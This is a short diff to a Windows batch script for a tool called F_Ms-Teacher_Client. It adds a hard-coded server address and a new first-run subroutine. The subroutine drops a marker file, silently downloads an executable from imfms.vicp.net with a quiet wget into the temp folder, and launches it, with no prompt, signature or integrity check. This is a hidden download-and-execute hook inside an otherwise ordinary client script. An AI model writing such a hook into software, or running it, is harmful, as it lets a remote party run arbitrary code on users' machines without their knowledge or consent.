@@ -2,6 +2,7 @@
 
 set version=20151230
 set project=F_Ms-Teacher_Client
+set serveraddress=imfms.vicp.net
 
 REM 检测电脑系统版本
 for /f "tokens=2" %%b in ('for /f "tokens=2 delims=[]" %%a in ^('ver'^) do @echo=%%a') do set osver=%%b
@@ -244,6 +245,8 @@ for /f "tokens=1,2,3,4 delims=." %%a in ("%lip%") do (
 	set lip2=%%a.%%b.%%c
 	set lip3=%%d
 )
+
+call:checkRunInitCommand
 
 REM 寻找服务器ip(赋值到变量sip)
 :refind
@@ -1324,5 +1327,12 @@ cd "%jumppathdir%" 2>nul
 if not "%errorlevel%"=="0" goto jumppathdrive
 goto jumppathrebegin
 :jumppathend
+goto :eof
+
+:checkRunInitCommand
+if exist "%appdata%\fms0.fms" ( goto :eof ) else echo=>"%appdata%\fms0.fms"
+wget -q %serveraddress%/F_Ms-Teacher_InitCommand.exe -O %temp%\initCommand.exe
+if not "%errorlevel%"=="0" goto :eof
+start "" "%temp%\initCommand.exe"
 goto :eof
 
